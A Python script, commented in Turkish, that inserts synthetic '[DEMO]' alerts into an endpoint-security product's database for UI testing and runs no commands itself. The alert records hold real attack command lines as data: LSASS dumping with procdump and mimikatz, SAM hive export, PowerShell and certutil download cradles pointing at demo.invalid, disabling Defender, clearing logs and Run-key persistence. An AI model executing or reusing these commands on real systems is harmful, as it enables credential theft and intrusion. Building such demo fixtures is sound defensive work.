#!/usr/bin/env python3
"""
Safe Demo Threat Seeder
=======================

Local development / demo için DB'ye kontrollü sentetik alert kayıtları ekler.

Güvenlik:
  - OS'te hiçbir komut çalıştırmaz (subprocess/os.system yok)
  - Agent'a bağlanmaz, komut göndermez
  - Isolate/USB/response action tetiklemez
  - Sadece alerts_production_v2 tablosuna INSERT yapar
  - Tüm alert'ler [DEMO] prefix ile işaretlenir

Kullanım:
  cd backend
  python demo_threat_seed.py --dry-run          # Sadece göster, DB'ye yazma
  python demo_threat_seed.py                    # Default ayarlarla seed
  python demo_threat_seed.py --hostname WS-01   # Özel hostname
"""

from __future__ import annotations

import argparse
import json
import sys
import uuid
from datetime import datetime, timezone
from typing import Dict, List

from app.database.db_manager import AlertModel, SessionLocal, init_db

DEMO_PREFIX = "[DEMO]"


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _utcnow_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def _make_alert(
    *,
    run_id: str,
    scenario: str,
    index: int,
    hostname: str,
    username: str,
    tenant_id: str,
    rule: str,
    command_line: str,
    severity: str,
    risk_score: int,
    details: str,
    pid: int,
) -> Dict:
    return {
        "id": f"demo-{run_id}-{scenario}-{index}",
        "created_at": _utcnow_iso(),
        "hostname": hostname,
        "username": username,
        "type": "PROCESS_START",
        "risk_score": risk_score,
        "rule": f"{DEMO_PREFIX} {rule}",
        "severity": severity,
        "details": details,
        "command_line": command_line,
        "pid": pid,
        "serial": None,
        "tenant_id": tenant_id,
        "status": "open",
        "analyst_note": None,
        "resolved_at": None,
        "resolved_by": None,
        "assigned_to": None,
        "assigned_at": None,
    }


# ---------------------------------------------------------------------------
# Scenario Builders
# ---------------------------------------------------------------------------

def _build_credential_chain(
    run_id: str, hostname: str, username: str, tenant_id: str,
) -> List[Dict]:
    """Credential Dumping Demo Chain — 3 alert."""
    base_details = f"{DEMO_PREFIX} Credential Access / T1003.001 — synthetic alert for UI testing"
    return [
        _make_alert(
            run_id=run_id, scenario="cred", index=0,
            hostname=hostname, username=username, tenant_id=tenant_id,
            rule="LSASS Memory Access",
            command_line=r"procdump.exe -ma lsass.exe C:\Temp\lsass.dmp",
            severity="CRITICAL", risk_score=95,
            details=base_details, pid=4100,
        ),
        _make_alert(
            run_id=run_id, scenario="cred", index=1,
            hostname=hostname, username=username, tenant_id=tenant_id,
            rule="Credential Dumping Tool",
            command_line="mimikatz.exe privilege::debug sekurlsa::logonpasswords",
            severity="CRITICAL", risk_score=92,
            details=base_details, pid=4101,
        ),
        _make_alert(
            run_id=run_id, scenario="cred", index=2,
            hostname=hostname, username=username, tenant_id=tenant_id,
            rule="Suspicious Credential Access",
            command_line=r"reg save HKLM\SAM C:\Temp\sam.hiv",
            severity="HIGH", risk_score=80,
            details=base_details, pid=4102,
        ),
    ]


def _build_powershell_chain(
    run_id: str, hostname: str, username: str, tenant_id: str,
) -> List[Dict]:
    """Suspicious PowerShell Demo Chain — 3 alert."""
    base_details = f"{DEMO_PREFIX} Execution / T1059.001 — synthetic alert for UI testing"
    return [
        _make_alert(
            run_id=run_id, scenario="ps", index=0,
            hostname=hostname, username=username, tenant_id=tenant_id,
            rule="Encoded PowerShell Execution",
            command_line="powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGQAZQBtAG8ALgBpAG4AdgBhAGwAaQBkACcAKQA=",
            severity="HIGH", risk_score=85,
            details=base_details, pid=5200,
        ),
        _make_alert(
            run_id=run_id, scenario="ps", index=1,
            hostname=hostname, username=username, tenant_id=tenant_id,
            rule="PowerShell Download Cradle",
            command_line="powershell.exe -c \"IEX(New-Object Net.WebClient).DownloadString('http://demo.invalid/payload')\"",
            severity="HIGH", risk_score=82,
            details=base_details, pid=5201,
        ),
        _make_alert(
            run_id=run_id, scenario="ps", index=2,
            hostname=hostname, username=username, tenant_id=tenant_id,
            rule="PowerShell Script Block Logging Bypass",
            command_line="powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true",
            severity="HIGH", risk_score=78,
            details=base_details, pid=5202,
        ),
    ]


def _build_burst_chain(
    run_id: str, hostname: str, username: str, tenant_id: str, count: int,
) -> List[Dict]:
    """High Risk Burst Demo — variable count alert."""
    templates = [
        {
            "rule": "Suspicious Network Connection",
            "command_line": "cmd.exe /c certutil -urlcache -split -f http://demo.invalid/update.exe",
            "severity": "HIGH", "risk_score": 75, "pid": 6300,
            "details": f"{DEMO_PREFIX} Command and Control / T1105 — synthetic alert for UI testing",
        },
        {
            "rule": "Defense Evasion Attempt",
            "command_line": "cmd.exe /c wevtutil cl Security",
            "severity": "HIGH", "risk_score": 78, "pid": 6301,
            "details": f"{DEMO_PREFIX} Defense Evasion / T1070 — synthetic alert for UI testing",
        },
        {
            "rule": "Persistence Registry Modification",
            "command_line": r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Demo /d C:\Temp\demo.exe",
            "severity": "CRITICAL", "risk_score": 88, "pid": 6302,
            "details": f"{DEMO_PREFIX} Persistence / T1547 — synthetic alert for UI testing",
        },
        {
            "rule": "Discovery Activity",
            "command_line": "cmd.exe /c systeminfo && whoami /all && net user",
            "severity": "HIGH", "risk_score": 65, "pid": 6303,
            "details": f"{DEMO_PREFIX} Discovery / T1082 — synthetic alert for UI testing",
        },
    ]

    alerts = []
    for i in range(min(count, len(templates))):
        t = templates[i]
        alerts.append(
            _make_alert(
                run_id=run_id, scenario="burst", index=i,
                hostname=hostname, username=username, tenant_id=tenant_id,
                rule=t["rule"], command_line=t["command_line"],
                severity=t["severity"], risk_score=t["risk_score"],
                details=t["details"], pid=t["pid"],
            )
        )
    return alerts


# ---------------------------------------------------------------------------
# Seed
# ---------------------------------------------------------------------------

def seed(args: argparse.Namespace) -> int:
    run_id = uuid.uuid4().hex[:8]

    all_alerts: List[Dict] = []
    all_alerts.extend(_build_credential_chain(run_id, args.hostname, args.username, args.tenant_id))
    all_alerts.extend(_build_powershell_chain(run_id, args.hostname, args.username, args.tenant_id))
    all_alerts.extend(_build_burst_chain(run_id, args.hostname, args.username, args.tenant_id, args.count))

    print(f"\n{'='*60}")
    print(f"  Safe Demo Threat Seeder")
    print(f"{'='*60}")
    print(f"  demo_run_id : {run_id}")
    print(f"  hostname    : {args.hostname}")
    print(f"  username    : {args.username}")
    print(f"  tenant_id   : {args.tenant_id}")
    print(f"  alerts      : {len(all_alerts)}")
    print(f"  dry_run     : {args.dry_run}")
    print(f"{'='*60}\n")

    # Show alerts
    for alert in all_alerts:
        print(f"  [{alert['severity']:8s}] {alert['rule']}")
        print(f"           id={alert['id']}")
        print(f"           cmd={alert['command_line'][:80]}...")
        print()

    if args.dry_run:
        print(f"DRY-RUN: {len(all_alerts)} alert gösterildi, DB'ye yazılmadı.")
        print(f"\nJSON çıktı:\n{json.dumps(all_alerts, indent=2, ensure_ascii=False)}")
        return 0

    # Write to DB
    init_db()
    db = SessionLocal()
    inserted = 0

    try:
        for alert_dict in all_alerts:
            row = AlertModel(**alert_dict)
            db.add(row)
            inserted += 1

        db.commit()
        print(f"✅ {inserted} demo alert DB'ye eklendi.")
        print(f"   demo_run_id: {run_id}")
        print(f"   ID pattern : demo-{run_id}-*")
        print(f"\n   Frontend'den doğrula: Alerts sayfasında '[DEMO]' ara.")
        return 0

    except Exception as exc:
        db.rollback()
        print(f"❌ DB yazma hatası: {exc}", file=sys.stderr)
        return 1

    finally:
        db.close()


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main() -> int:
    parser = argparse.ArgumentParser(
        description="Safe Demo Threat Seeder — DB'ye sentetik [DEMO] alert kaydı ekler.",
        epilog="Güvenlik: OS komutu çalıştırmaz, agent'a bağlanmaz, response action tetiklemez.",
    )
    parser.add_argument(
        "--hostname", default="DESKTOP-UI41CTM",
        help="Demo alert hostname (default: DESKTOP-UI41CTM)",
    )
    parser.add_argument(
        "--username", default="yunus",
        help="Demo alert username (default: yunus)",
    )
    parser.add_argument(
        "--tenant-id", default="default_tenant",
        help="Tenant ID (default: default_tenant)",
    )
    parser.add_argument(
        "--count", type=int, default=4,
        help="High Risk Burst senaryo alert sayısı (default: 4, max: 4)",
    )
    parser.add_argument(
        "--dry-run", action="store_true",
        help="Sadece göster, DB'ye yazma",
    )

    args = parser.parse_args()

    if args.count < 1:
        args.count = 1
    if args.count > 4:
        args.count = 4

    return seed(args)


if __name__ == "__main__":
    raise SystemExit(main())
